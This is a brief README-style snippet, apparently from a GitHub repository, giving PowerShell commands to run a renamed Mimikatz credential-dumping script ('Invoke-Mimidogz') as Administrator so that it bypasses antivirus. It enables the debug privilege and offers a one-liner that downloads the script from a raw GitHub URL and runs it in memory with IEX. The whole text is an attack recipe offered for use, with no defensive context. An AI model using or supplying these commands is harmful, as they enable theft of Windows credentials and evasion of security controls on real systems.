### mimikatz bypass Antivirus

Powershell as Administrator

    Import-Module .\Invoke-Mimidogz.ps1
    Invoke-Mimikatz -Command "privilege::debug"

or via web:

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mttstt/mimi/master/Invoke-Mimidogz.ps1');Invoke-Mimidogz -Command "privilege::debug" 
